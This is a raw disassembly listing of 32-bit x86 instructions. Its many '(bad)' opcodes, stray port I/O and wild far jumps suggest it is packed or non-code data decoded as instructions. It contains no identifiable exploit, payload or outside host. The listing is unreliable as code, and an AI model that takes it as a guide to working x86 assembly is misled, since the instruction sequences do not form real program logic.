  42dca3:	in     eax,0xbe
  42dca5:	xchg   ebx,eax
  42dca6:	(bad)  
  42dca7:	sub    DWORD PTR [ecx+edx*1+0x3f1a83ee],eax
  42dcae:	rcr    DWORD PTR [ebx-0x50029527],cl
  42dcb4:	xchg   ebx,eax
  42dcb5:	xor    al,0x5e
  42dcb7:	cwde   
  42dcb8:	push   esp
  42dcb9:	push   ebp
  42dcba:	add    DWORD PTR [ebx-0x84da9c3],edi
  42dcc0:	xor    al,0xcc
  42dcc2:	retf   0x1be9
  42dcc5:	push   esi
  42dcc6:	adc    al,cl
  42dcc8:	mov    ds:0x4540692b,al
  42dccd:	or     ah,bl
  42dccf:	ret    
  42dcd0:	and    bl,BYTE PTR [ecx-0x2f]
  42dcd3:	repnz push es
  42dcd5:	xchg   edi,eax
  42dcd6:	jle    0x42dcf7
  42dcd8:	lock ins DWORD PTR es:[edi],dx
  42dcda:	or     BYTE PTR [ebp+eiz*1-0x57f18282],bl
  42dce1:	pop    edi
  42dce2:	or     al,0x3e
  42dce4:	sbb    BYTE PTR [esi-0x7c],bl
  42dce7:	mov    esi,0xefb2d11c
  42dcec:	mov    ?,WORD PTR [edx+0x0]
	...
  42dd56:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	popf   
  42dd63:	pop    edx
  42dd64:	(bad)  
  42dd65:	adc    al,0x67
  42dd67:	jmp    0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    cl,bl
  42dd6f:	push   eax
  42dd70:	cmp    eax,0x5237ad19
  42dd75:	and    eax,0x9b06ca77
  42dd7a:	push   ds
  42dd7b:	mov    cl,0x38
  42dd7d:	xor    al,0x67
  42dd7f:	and    DWORD PTR [edx],ebx
  42dd81:	sbb    DWORD PTR [edi+0x3b],ebx
  42dd84:	ret    0x5211
  42dd87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd88:	pop    ds
  42dd89:	data16 int3 
  42dd8b:	out    dx,eax
  42dd8c:	aad    0x68
  42dd8e:	addr16 pop es
  42dd90:	mov    ebx,0xaa943dc2
  42dd95:	ror    al,0x9b
  42dd98:	and    eax,DWORD PTR [ecx]
  42dd9a:	xor    dh,cl
  42dd9c:	repnz push ecx
  42dd9e:	dec    ebp
  42dd9f:	pop    esp
  42dda0:	sbb    BYTE PTR [ebx+0x71a2aff7],0x22
  42dda7:	(bad)
  42ddac:	pop    ebp
  42ddad:	mov    bl,0x4
  42ddaf:	push   eax
  42ddb0:	or     BYTE PTR [edx-0xc],ch
  42ddb3:	jae    0x42dd9b
  42ddb5:	and    edx,eax
  42ddb7:	dec    ecx
  42ddb8:	shl    BYTE PTR [esi+0x6eeb02a0],cl
  42ddbe:	lock xchg DWORD PTR [ebx],eax
  42ddc1:	out    dx,al
  42ddc2:	sbb    edx,DWORD PTR [ecx+0x1590fcc4]
  42ddc8:	and    cl,bh
  42ddca:	add    eax,0x40a7851b
  42ddcf:	push   cs
  42ddd0:	cmp    BYTE PTR ds:0x7fab85b9,ah
  42ddd6:	scas   al,BYTE PTR es:[edi]
  42ddd7:	int    0xc5
  42ddd9:	adc    dh,BYTE PTR [eax+0x137aa92d]
  42dddf:	je     0x42de37
  42dde1:	dec    edi
  42dde2:	(bad)  
  42dde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dde4:	push   esi
  42dde5:	inc    eax
  42dde6:	cmp    al,0x18
  42dde8:	ss das 
  42ddea:	lods   al,BYTE PTR ds:[esi]
  42ddeb:	pop    esi
  42ddec:	and    DWORD PTR [edx+0x3c],esi
  42ddef:	das    
  42ddf0:	or     DWORD PTR [ecx],0xffffffc8
  42ddf3:	sti    
  42ddf4:	stc    
  42ddf5:	sub    eax,0xa24ca49d
  42ddfa:	stos   DWORD PTR es:[edi],eax
  42ddfb:	pop    ss
  42ddfc:	cli    
  42ddfd:	mov    DWORD PTR [ecx+0x7a],eax
  42de00:	xor    al,cl
  42de02:	pop    ecx
  42de03:	cli    
  42de04:	fsubr  DWORD PTR [esi]
  42de06:	add    DWORD PTR [ebx+0x91263ca],edx
  42de0c:	in     eax,dx
  42de0d:	(bad)  
  42de0e:	sub    al,dh
  42de10:	in     eax,dx
  42de11:	jl     0x42dda8
  42de13:	std    
  42de14:	or     BYTE PTR [ebp-0x5f],cl
  42de17:	xchg   esi,eax
  42de18:	cmp    edx,DWORD PTR [edi-0x3d4d0b0f]
  42de1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de1f:	ins    DWORD PTR es:[edi],dx
  42de20:	sbb    ebp,eax
  42de22:	or     BYTE PTR [esi+eax*4],cl
  42de25:	outs   dx,BYTE PTR ds:[esi]
  42de26:	xchg   esi,eax
  42de27:	add    ecx,DWORD PTR [ebx+0x7]
  42de2a:	mov    dl,0xd4
  42de2c:	jo     0x42de2a
  42de2e:	xor    BYTE PTR [esi+0x51],cl
  42de31:	and    eax,edx
  42de33:	xchg   esp,eax
  42de34:	push   esi
  42de35:	jge    0x42ddcf
  42de37:	sbb    DWORD PTR [edi-0x5d51e073],esi
  42de3d:	jp     0x42dea4
  42de3f:	mov    ds:0x7998e268,al
  42de44:	or     BYTE PTR [eax],0xd3
  42de47:	mov    dh,0x84
  42de49:	fsub   QWORD PTR [ebp-0x57]
  42de4c:	test   DWORD PTR cs:[eax],esp
  42de4f:	in     eax,dx
  42de50:	scas   eax,DWORD PTR es:[edi]
  42de51:	dec    edi
  42de52:	push   0xfffffff5
  42de54:	mov    edx,0xa69c3f6
  42de59:	jb     0x42dea6
  42de5b:	in     al,dx
  42de5c:	test   BYTE PTR [esi-0x74b3ff2d],dl
  42de62:	mov    ebp,0xab937ba4
  42de67:	or     dl,BYTE PTR [ecx+0x7520d5bb]
  42de6d:	nop
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	xor    ecx,DWORD PTR [edi]
  42dee4:	test   BYTE PTR [ecx+0x67],ah
  42dee7:	in     al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	iret   
  42deef:	or     cl,BYTE PTR [ebp-0x3b3ac84d]
  42def5:	sub    al,0xa6
  42def7:	push   ss
  42def8:	ret    
  42def9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42defa:	xor    al,0x13
  42defc:	pop    ebx
  42defd:	push   0x46
  42deff:	imul   esp,DWORD PTR [edx-0x6f],0xffffffac
  42df03:	push   edi
  42df04:	and    eax,0x69719638
  42df09:	mov    edx,0xbeb6bdb2
  42df0e:	ds xchg ecx,eax
  42df10:	hlt    
  42df11:	or     DWORD PTR [edx+0x3ca51986],eax
  42df17:	xchg   ebp,eax
  42df18:	push   edi
  42df19:	cmp    eax,0x156b8aeb
  42df1e:	data16 adc bh,BYTE PTR [ecx+edi*8]
  42df22:	fidivr DWORD PTR [edx-0x7d9f0777]
  42df28:	in     eax,dx
  42df29:	pop    eax
  42df2a:	mov    ds:0xb79169a1,eax
  42df2f:	dec    ebp
  42df30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df31:	mov    ss,ecx
  42df33:	fidivr DWORD PTR [esi+0x66c5c1cc]
  42df39:	push   ecx
  42df3a:	outs   dx,DWORD PTR cs:[esi]
  42df3c:	dec    eax
  42df3d:	imul   esi,DWORD PTR [ecx-0x3e83f9d1],0x21d631e5
  42df47:	push   ebp
  42df48:	loopne 0x42dfa5
  42df4a:	neg    DWORD PTR ds:0xe4b9e896
  42df50:	and    eax,0x2655c5d4
  42df55:	stos   BYTE PTR es:[edi],al
  42df56:	(bad)  
  42df57:	push   ds
  42df58:	ror    BYTE PTR [edi+esi*4-0x49],0x19
  42df5d:	imul   ebp,DWORD PTR [eax-0x62],0x63
  42df61:	repz mov esi,DWORD PTR [edx-0x24]
  42df65:	cli    
  42df66:	call   FWORD PTR [eax+0x5a]
  42df69:	arpl   WORD PTR [edi],sp
  42df6b:	sub    BYTE PTR [edx+0x7],0x97
  42df6f:	xchg   ebp,eax
  42df70:	mov    esp,0x9f2e6c9a
  42df75:	xchg   esp,eax
  42df76:	sti    
  42df77:	mov    eax,ds:0x80149c94
  42df7c:	aaa    
  42df7d:	pop    eax
  42df7e:	mov    ah,0x17
  42df80:	std    
  42df81:	pop    esp
  42df82:	add    al,BYTE PTR [edi-0x61]
  42df85:	mov    ss,WORD PTR [esi+0x77e889ef]
  42df8b:	xchg   bl,cl
  42df8d:	scas   al,BYTE PTR es:[edi]
  42df8e:	(bad)  
  42df8f:	jl     0x42df26
  42df91:	mov    edx,0x8007dfbf
  42df96:	(bad)  
  42df97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df98:	and    cl,cl
  42df9a:	add    al,0x5d
  42df9c:	xchg   ebx,eax
  42df9d:	(bad)
  42dfa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfa2:	imul   esi,edx,0x1440260f
  42dfa8:	je     0x42dfda
  42dfaa:	mov    cl,0xe0
  42dfac:	pop    esi
  42dfad:	stos   BYTE PTR es:[edi],al
  42dfae:	inc    ebx
  42dfaf:	pop    edx
  42dfb0:	push   edx
  42dfb1:	inc    edi
  42dfb2:	cmp    edi,DWORD PTR ds:0x1df2195c
  42dfb8:	ins    DWORD PTR es:[edi],dx
  42dfb9:	pop    ds
  42dfba:	enter  0xf3bb,0x7c
  42dfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfbf:	sbb    al,0xfb
  42dfc1:	add    al,0x12
  42dfc3:	inc    ecx
  42dfc4:	jb     0x42df4e
  42dfc6:	retf   0x34b8
  42dfc9:	mov    ecx,0xe00738b5
  42dfce:	jmp    0x3469d218
  42dfd3:	adc    ecx,DWORD PTR [esi-0x46]
  42dfd6:	inc    BYTE PTR [edi-0xd]
  42dfd9:	inc    ebx
  42dfda:	and    BYTE PTR [edx+0x45a5811],ch
  42dfe0:	push   cs
  42dfe1:	popf   
  42dfe2:	xchg   esp,eax
  42dfe3:	push   ds
  42dfe4:	lods   eax,DWORD PTR ds:[esi]
  42dfe5:	call   0xab42:0xd598a505
  42dfec:	fdiv   DWORD PTR [eax+0x0]
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x63]
  42e063:	jo     0x42e08b
  42e065:	xchg   edi,eax
  42e066:	addr16 in eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	(bad)  
  42e06f:	inc    ebp
  42e070:	hlt    
  42e071:	jnp    0x42e089
  42e073:	in     al,dx
  42e074:	out    0xd9,eax
  42e076:	(bad)  
  42e077:	and    esi,DWORD PTR [esi-0x6]
  42e07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e07b:	jae    0x42e0af
  42e07d:	das    
  42e07e:	call   0x1f65:0x10d394ab
  42e085:	mov    eax,edi
  42e087:	retf   0x75bd
  42e08a:	push   0xffffff96
  42e08c:	(bad)  
  42e08e:	into   
  42e08f:	std    
  42e090:	xchg   ecx,eax
  42e091:	add    edx,DWORD PTR [edi+edi*1+0x59]
  42e095:	pushf  
  42e096:	push   eax
  42e097:	jge    0x42e0dc
  42e099:	loope  0x42e0a1
  42e09b:	nop
  42e09c:	icebp  
  42e09d:	mov    esi,0x31bdc454
  42e0a2:	mov    ah,cl
  42e0a4:	add    al,BYTE PTR [ebx+ecx*4]
  42e0a7:	mov    ecx,0x732cc5ce
  42e0ac:	out    dx,eax
  42e0ad:	cmp    DWORD PTR ds:0xa60b48e5,0x11a3c4c6
  42e0b7:	sub    BYTE PTR [edx+0x2b],0xf2
  42e0bb:	icebp  
  42e0bc:	gs pusha 
  42e0be:	sub    BYTE PTR [ebx+edi*1],ch
  42e0c1:	xchg   esi,eax
  42e0c2:	xlat   BYTE PTR ds:[ebx]
  42e0c3:	push   ecx
  42e0c4:	pop    edi
  42e0c5:	push   edx
  42e0c6:	popa   
  42e0c7:	pop    ebp
  42e0c8:	fnsave [ebx-0x1b6a1fed]
  42e0ce:	test   eax,0x8772a8bb
  42e0d3:	xchg   edi,eax
  42e0d4:	xchg   ebp,eax
  42e0d5:	and    ecx,DWORD PTR [esi-0x54]
  42e0d8:	aam    0x18
  42e0da:	inc    edx
  42e0db:	jne    0x42e06b
  42e0dd:	add    DWORD PTR [esp+ebx*2-0x7a],ebx
  42e0e1:	lea    ebp,[esi-0x2f4fa71e]
  42e0e7:	add    ebp,DWORD PTR [edx+ebp*4-0x3f]
  42e0eb:	add    DWORD PTR ds:0x76005b57,edi
  42e0f1:	(bad)  
  42e0f2:	sbb    DWORD PTR [edi-0xc],esp
  42e0f5:	icebp  
  42e0f6:	sar    DWORD PTR [ecx+ecx*8+0x52620673],cl
  42e0fd:	fcmovne st,st(3)
  42e0ff:	ins    DWORD PTR es:[edi],dx
  42e100:	scas   eax,DWORD PTR es:[edi]
  42e101:	icebp  
  42e102:	push   esp
  42e103:	push   0x3d
  42e105:	sbb    al,0x64
  42e107:	dec    ebx
  42e108:	inc    ebp
  42e109:	lods   eax,DWORD PTR ds:[esi]
  42e10a:	mov    ebp,0xc24d863a
  42e10f:	inc    ebx
  42e110:	aaa    
  42e111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e112:	out    0x7e,eax
  42e114:	pusha  
  42e115:	ja     0x42e181
  42e117:	push   esi
  42e118:	sbb    esi,DWORD PTR [ebx-0x66]
  42e11b:	inc    ebp
  42e11c:	mov    edx,0x7ac40be7
  42e121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e122:	(bad)  
  42e123:	clc    
  42e124:	(bad)  
  42e125:	jle    0x42e0e2
  42e127:	sbb    ebx,DWORD PTR [ecx]
  42e129:	xchg   DWORD PTR gs:0x259debc3,esi
  42e130:	fld    QWORD PTR [edi]
  42e132:	inc    edi
  42e133:	cmp    al,0x46
  42e135:	cmp    bl,dl
  42e137:	sar    ecx,1
  42e139:	pop    edx
  42e13a:	inc    ebp
  42e13b:	or     ecx,eax
  42e13d:	sub    DWORD PTR [ebx],ebx
  42e13f:	xor    eax,0xaf2f1931
  42e144:	inc    edx
  42e145:	adc    BYTE PTR [ebp+0x26],bl
  42e148:	sahf   
  42e149:	dec    ebp
  42e14a:	aas    
  42e14b:	xchg   esi,eax
  42e14c:	retf   0x60d
  42e14f:	jecxz  0x42e11f
  42e151:	daa    
  42e152:	push   ecx
  42e153:	jnp    0x42e0e8
  42e155:	adc    eax,DWORD PTR [ebx+0x3625da7f]
  42e15b:	imul   ebp,DWORD PTR [ebx-0x7566d0ce],0x5d
  42e162:	pop    es
  42e163:	push   ds
  42e164:	in     al,0x2d
  42e166:	retf   0xf83d
  42e169:	stos   BYTE PTR es:[edi],al
  42e16a:	cmp    eax,0x7044cb
	...
  42e1d3:	add    BYTE PTR [eax],al
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	mov    ah,0x3c
  42e1e4:	xor    DWORD PTR [edi],esp
  42e1e6:	addr16 out dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	dec    ebp
  42e1ef:	stos   BYTE PTR es:[edi],al
  42e1f0:	je     0x42e230
  42e1f2:	push   eax
  42e1f3:	cmp    ebp,DWORD PTR [eax+0x61]
  42e1f6:	inc    esi
  42e1f7:	in     al,dx
  42e1f8:	and    BYTE PTR [edi+0x144f6753],bh
  42e1fe:	pop    edi
  42e1ff:	ret    0xdfb2
  42e202:	push   ss
  42e203:	hlt    
  42e204:	push   0x8ba65777
  42e209:	test   ebp,edi
  42e20b:	push   eax
  42e20c:	das    
  42e20d:	xchg   BYTE PTR [edx-0x29627d80],bh
  42e213:	cmp    ah,BYTE PTR [eax]
  42e215:	out    dx,eax
  42e216:	(bad)  
  42e217:	ja     0x42e1ec
  42e219:	shl    ah,cl
  42e21b:	(bad)  
  42e21c:	adc    bl,bh
  42e21e:	add    dh,BYTE PTR [eax]
  42e220:	xchg   DWORD PTR [ebx+ebx*8-0x636f5311],ecx
  42e227:	ret    
  42e228:	jmp    0x8f656d0b
  42e22d:	fbstp  TBYTE PTR [ecx+0x1]
  42e230:	(bad)  
  42e231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e232:	dec    eax
  42e233:	mov    eax,ds:0xdac203b1
  42e238:	jmp    0xc8c40d6f
  42e23d:	xlat   BYTE PTR ds:[ebx]
  42e23e:	lods   eax,DWORD PTR ds:[esi]
  42e23f:	sbb    BYTE PTR [eax-0x45],0xb4
  42e243:	(bad)
  42e246:	cmp    al,0x52
  42e248:	push   ebp
  42e249:	mov    dl,0x9d
  42e24b:	int3   
  42e24c:	mov    esi,0x10b82aa8
  42e251:	daa    
  42e252:	jg     0x42e27b
  42e254:	shl    DWORD PTR [ebx-0x62],cl
  42e257:	mov    dl,0x14
  42e259:	jg     0x42e259
  42e25b:	pop    ds
  42e25c:	cmc    
  42e25d:	je     0x42e2ad
  42e25f:	ja     0x42e232
  42e261:	stos   BYTE PTR es:[edi],al
  42e262:	je     0x42e21e
  42e264:	sub    al,0xaf
  42e266:	pop    ebp
  42e267:	mov    fs,WORD PTR [edx+0x610c061]
  42e26d:	repnz or esi,DWORD PTR [ecx*8+0x398a0d5c]
  42e275:	out    0x9c,eax
  42e277:	mov    esi,0x57b1871a
  42e27c:	pop    esi
  42e27d:	out    dx,eax
  42e27e:	add    ah,cl
  42e280:	and    edx,edi
  42e282:	dec    esi
  42e283:	mov    edi,0xb0a320a5
  42e288:	xchg   dl,bl
  42e28a:	jp     0x42e25e
  42e28c:	push   cs
  42e28d:	js     0x42e2c4
  42e28f:	cwde   
  42e290:	mov    DWORD PTR [ebx+edi*1],edi
  42e293:	push   edi
  42e294:	cmp    ch,BYTE PTR [esi+0x4e]
  42e297:	jl     0x42e256
  42e299:	pop    esp
  42e29a:	ja     0x42e2a1
  42e29c:	mov    esp,0x1f87dce3
  42e2a1:	loopne 0x42e26d
  42e2a3:	inc    ebp
  42e2a4:	or     al,0x5d
  42e2a6:	rcl    BYTE PTR [ecx+0xcdeaf0d],0x4c
  42e2ad:	fwait
  42e2ae:	lock sahf 
  42e2b0:	jmp    0x5fa7:0xc29983aa
  42e2b7:	pop    ds
  42e2b8:	retf   0xa201
  42e2bb:	ins    BYTE PTR es:[edi],dx
  42e2bc:	sub    al,0xfc
  42e2be:	push   esi
  42e2bf:	cmp    al,0xbd
  42e2c1:	push   0x45ea3efd
  42e2c6:	cdq    
  42e2c7:	mov    edi,0xd48876d1
  42e2cc:	pop    ebp
  42e2cd:	sub    al,0x50
  42e2cf:	ficomp DWORD PTR gs:[ecx-0x77]
  42e2d3:	xchg   ebx,eax
  42e2d4:	jecxz  0x42e275
  42e2d6:	rcl    BYTE PTR [ebx],1
  42e2d8:	repnz leave 
  42e2da:	loop   0x42e2fd
  42e2dc:	xor    eax,0x885577f6
  42e2e1:	ins    BYTE PTR es:[edi],dx
  42e2e2:	add    ebp,0xf0e0e745
  42e2e8:	(bad)  
  42e2e9:	mov    ecx,0xbd955c8d
	...
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0x5f199140
  42e363:	mov    eax,ds:0xef6719de
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	sub    DWORD PTR [ebx+esi*1],edi
  42e371:	pop    esi
  42e372:	mov    ecx,0xa6ab3067
  42e377:	aaa    
  42e378:	jae    0x42e3b9
  42e37a:	xor    BYTE PTR [edx-0xd],ah
  42e37d:	inc    edx
  42e37e:	xlat   BYTE PTR ds:[ebx]
  42e37f:	cld    
  42e380:	and    BYTE PTR [eax+eax*4-0x53],bl
  42e384:	ins    BYTE PTR es:[edi],dx
  42e385:	add    ecx,DWORD PTR [eax-0x3f000c6d]
  42e38b:	push   esi
  42e38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e38d:	fwait
  42e38e:	loop   0x42e40c
  42e390:	adc    eax,0xb50e2170
  42e395:	or     ebx,DWORD PTR [ebx+0x7825b39a]
  42e39b:	push   cs
  42e39c:	out    dx,eax
  42e39d:	add    ch,BYTE PTR [ebx]
  42e39f:	nop
  42e3a0:	cwde   
  42e3a1:	repnz cdq 
  42e3a3:	rol    BYTE PTR [edi-0x32acf48e],cl
  42e3a9:	or     al,BYTE PTR [ebx]
  42e3ab:	or     DWORD PTR [eax+0x4e],0xaf4adad4
  42e3b2:	mov    eax,fs
  42e3b4:	and    ebx,edx
  42e3b6:	push   cs
  42e3b7:	dec    esi
  42e3b8:	xor    bh,cl
  42e3ba:	adc    DWORD PTR [ebx],0xeecff17c
  42e3c0:	jl     0x42e399
  42e3c2:	out    0x23,eax
  42e3c4:	outs   dx,BYTE PTR ds:[esi]
  42e3c5:	inc    ecx
  42e3c6:	sbb    dl,ah
  42e3c8:	cld    
  42e3c9:	leave  
  42e3ca:	xor    al,0x38
  42e3cc:	sti    
  42e3cd:	adc    eax,0xdc1fa620
  42e3d2:	cli    
  42e3d3:	xchg   edi,eax
  42e3d4:	test   BYTE PTR [esi-0x313b4ab0],dl
  42e3da:	bound  eax,QWORD PTR [edx-0x476dc458]
  42e3e0:	shl    bl,1
  42e3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3e3:	adc    eax,0xf4e615db
  42e3e8:	ja     0x42e461
  42e3ea:	cli    
  42e3eb:	dec    ebx
  42e3ec:	(bad)  
  42e3ed:	push   edx
  42e3ee:	loopne 0x42e3e2
  42e3f0:	mov    ecx,0x825d8c7f
  42e3f5:	inc    ecx
  42e3f6:	(bad)  
  42e3f7:	outs   dx,BYTE PTR ds:[esi]
  42e3f8:	mov    DWORD PTR [eax-0x51c34afe],edx
  42e3fe:	dec    ebx
  42e3ff:	xchg   edi,eax
  42e400:	mov    ebx,0xbbc487ab
  42e405:	cwde   
  42e406:	ds and al,0x68
  42e409:	aam    0x71
  42e40b:	les    ebx,FWORD PTR [eax]
  42e40d:	push   eax
  42e40e:	lds    ecx,FWORD PTR [eax-0xb]
  42e411:	cmc    
  42e412:	jge    0x42e469
  42e414:	std    
  42e415:	cwde   
  42e416:	sbb    al,0x40
  42e418:	sbb    ebx,DWORD PTR [ecx-0x461cdf0e]
  42e41e:	and    al,BYTE PTR [ecx-0x353ec44d]
  42e424:	sbb    al,0x22
  42e426:	push   esi
  42e427:	and    al,0x6d
  42e429:	stos   DWORD PTR es:[edi],eax
  42e42a:	push   ds
  42e42b:	stc    
  42e42c:	push   esp
  42e42d:	icebp  
  42e42e:	test   DWORD PTR [ecx],edi
  42e430:	cli    
  42e431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e432:	adc    al,0x46
  42e434:	push   cs
  42e435:	cld    
  42e436:	cmp    dh,ah
  42e438:	inc    edx
  42e439:	ja     0x42e47a
  42e43b:	mov    bh,0xb2
  42e43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e43e:	pop    ds
  42e43f:	out    dx,eax
  42e440:	pop    ebx
  42e441:	dec    ebp
  42e442:	ja     0x42e431
  42e444:	jnp    0x42e400
  42e446:	xor    eax,0xe0a444c7
  42e44b:	ret    
  42e44c:	into   
  42e44d:	pop    ebp
  42e44e:	add    DWORD PTR [ecx-0x17],ecx
  42e451:	and    BYTE PTR [eax-0x2f19cce6],0x8e
  42e458:	pop    ebx
  42e459:	sub    BYTE PTR [ecx],dl
  42e45b:	mov    edx,0xb0cc075
  42e460:	mov    ebx,DWORD PTR [edi+0x4c7a44e2]
  42e466:	(bad)  
  42e467:	jb     0x42e461
  42e469:	imul   DWORD PTR [edi+0x79b048]
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	ins    BYTE PTR es:[edi],dx
  42e4e3:	cs inc esp
  42e4e5:	in     al,0x67
  42e4e7:	lock add DWORD PTR [eax],eax
  42e4ea:	add    BYTE PTR [ecx],al
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	fbld   TBYTE PTR [esi]
  42e4f0:	jecxz  0x42e4b9
  42e4f2:	adc    eax,0x39b25ba6
  42e4f7:	bound  ecx,QWORD PTR [eax+0x7b]
  42e4fa:	mov    ebp,0x9128fe31
  42e4ff:	in     al,0xfd
  42e501:	pop    ss
  42e502:	mov    dh,0x39
  42e504:	arpl   WORD PTR ds:0x4b26826a,ax
  42e50a:	aas    
  42e50b:	test   al,0x1c
  42e50d:	aas    
  42e50e:	xchg   ebp,eax
  42e50f:	add    dh,dl
  42e511:	pop    edi
  42e512:	cmp    cl,BYTE PTR [edx-0x15efa14a]
  42e518:	cmp    edi,0xffffffcf
  42e51b:	push   edi
  42e51c:	(bad)  
  42e51d:	fst    QWORD PTR [ebx+ebp*8]
  42e520:	ret    0xd407
  42e523:	popa   
  42e524:	enter  0x26d5,0xc5
  42e528:	pop    esp
  42e529:	add    DWORD PTR [ebp-0x2d],edx
  42e52c:	pop    ebp
  42e52d:	enter  0xd28d,0xfc
  42e531:	jns    0x42e58e
  42e533:	out    0xfd,al
  42e535:	jle    0x42e5b5
  42e537:	mov    bh,0xea
  42e539:	or     ch,ah
  42e53b:	jne    0x42e4d4
  42e53d:	es je  0x42e5aa
  42e540:	mov    eax,0x51d1dbed
  42e545:	sub    BYTE PTR [edx+0x6ddb3b6f],bh
  42e54b:	sbb    esi,DWORD PTR ds:0x8da37968
  42e551:	jbe    0x42e523
  42e553:	bound  eax,QWORD PTR [ecx+esi*4-0x78]
  42e557:	imul   esp,DWORD PTR [eax+0x5e],0x37
  42e55b:	loopne 0x42e50a
  42e55d:	xchg   esp,eax
  42e55e:	xor    al,BYTE PTR [edx]
  42e560:	clc    
  42e561:	add    al,0xc8
  42e563:	sub    eax,0x2361a681
  42e568:	retf   
  42e569:	bswap  edi
  42e56b:	add    al,0x17
  42e56d:	sub    eax,0x870b60eb
  42e572:	jb     0x42e512
  42e574:	(bad)  
  42e575:	fist   DWORD PTR [ebp-0x4e]
  42e578:	mov    edi,0x694649b9
  42e57d:	cmp    eax,0x14125b94
  42e582:	sbb    esp,DWORD PTR [ecx-0x5ccf4fe4]
  42e588:	xor    DWORD PTR [ebx-0x34b2cd3],esi
  42e58e:	push   ecx
  42e58f:	ins    DWORD PTR es:[edi],dx
  42e590:	and    dl,BYTE PTR [edx]
  42e592:	jmp    0x42e599
  42e594:	les    ebx,FWORD PTR [ecx]
  42e596:	ja     0x42e60f
  42e598:	cmp    DWORD PTR [ebx],0x559055d2
  42e59e:	adc    al,0x3
  42e5a0:	jae    0x42e568
  42e5a2:	je     0x42e60f
  42e5a4:	or     BYTE PTR [ebx-0x4065024c],bl
  42e5aa:	rcl    BYTE PTR [edi],0x62
  42e5ad:	icebp  
  42e5ae:	scas   eax,DWORD PTR es:[edi]
  42e5af:	sbb    bl,BYTE PTR [esi+0x2f]
  42e5b2:	dec    eax
  42e5b3:	in     al,0xe5
  42e5b5:	fcom   DWORD PTR [ebx-0x7]
  42e5b8:	fidivr WORD PTR [edx+0x21b3b61d]
  42e5be:	or     al,0x63
  42e5c0:	inc    ebp
  42e5c1:	imul   ecx,DWORD PTR [edi],0x8a4fb99e
  42e5c7:	sub    DWORD PTR [ebp+0xc],edi
  42e5ca:	jno    0x42e5a9
  42e5cc:	mov    al,0xf4
  42e5ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5cf:	gs loope 0x42e604
  42e5d2:	inc    esi
  42e5d3:	and    BYTE PTR [eax],al
  42e5d5:	cmp    bl,BYTE PTR [esi]
  42e5d7:	add    al,0xc3
  42e5d9:	shl    DWORD PTR [eax+0x3924009b],1
  42e5df:	mov    edx,0x494c72fa
  42e5e4:	push   esi
  42e5e5:	sub    BYTE PTR [eax+0x454d8ad1],ch
  42e5eb:	mov    esi,0x4012
	...
  42e654:	add    BYTE PTR [eax],al
  42e656:	push   ebp
  42e657:	cmp    dh,cl
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	repz rcr DWORD PTR [edx-0x49],0x67
  42e667:	icebp  
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	sub    ebx,esp
  42e670:	mov    bh,0xa8
  42e672:	push   eax
  42e673:	je     0x42e6a6
  42e675:	push   ds
  42e676:	pop    ebx
  42e677:	pushf  
